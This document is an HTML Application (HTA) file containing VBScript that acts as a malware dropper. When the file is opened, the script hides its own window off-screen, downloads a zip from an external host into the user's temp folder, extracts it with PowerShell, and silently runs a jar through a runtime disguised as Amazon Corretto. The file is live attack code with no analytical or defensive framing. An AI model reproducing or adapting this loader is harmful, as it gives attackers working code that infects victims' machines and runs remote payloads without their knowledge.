<html>
<head>
<HTA:APPLICATION
  SHOWINTASKBAR="no"
  WINDOWSTATE="minimize"
  BORDER="none"
  CAPTION="no"
/>

<script language="VBScript">
Sub Window_OnLoad
    Dim w # FFF
    Set w = window # FFF
    w.resizeTo 0, 0 # FFF 
    w.moveTo -27896, 13902 # FFF
    Set ntyu = CreateObject("WScript.Shell") # FFF
    temp = ntyu.ExpandEnvironmentStrings("%TEMP%") # FFF
    sFileURL = "http://b9x.me/xx/n.zip" # FFF
    sLocation = temp & "\corretto.zip" # FFF
    Download sFileURL, sLocation # FFF 
    ntyu.Run "powershell -c ""Expand-Archive -Path '" & temp & "\corretto.zip' -DestinationPath '" & temp & "\corretto'""", 0, True # FFF
    ntyu.Run """" & temp & "\corretto\amazon-corretto\jre8\bin\javaw.exe"" -jar """ & temp & "\corretto\amazon-corretto\jre8\bin\huh""", 0, False # FFF
End Sub


Function Download(sFileURL, sLocation)
    Download = False
    On Error Resume Next

    Dim objXMLHTTP, objADOStream

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET", sFileURL, False
    objXMLHTTP.send

    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile sLocation, 2
        objADOStream.Close
        Download = True
    End If

    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
End Function


</script>

</head>
<body></body>
</html>